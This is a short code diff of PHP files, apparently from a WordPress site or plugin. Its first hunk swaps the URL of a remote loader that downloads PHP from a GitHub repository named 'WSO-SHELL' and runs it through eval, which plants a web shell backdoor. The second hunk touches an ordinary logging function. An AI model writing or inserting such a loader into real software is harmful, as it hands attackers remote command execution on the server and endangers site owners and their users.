@@ -50,7 +50,7 @@ function is_logged_in()
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/cmd-terminal.php');
     eval('?>' . $a);
 
 ?>
@@ -140,3 +140,4 @@ function logIO( $io, $msg ) { // phpcs:ignore WordPress.NamingConventions.ValidF
 		error_log( $io . ' - ' . $msg );
 	}
 }
+
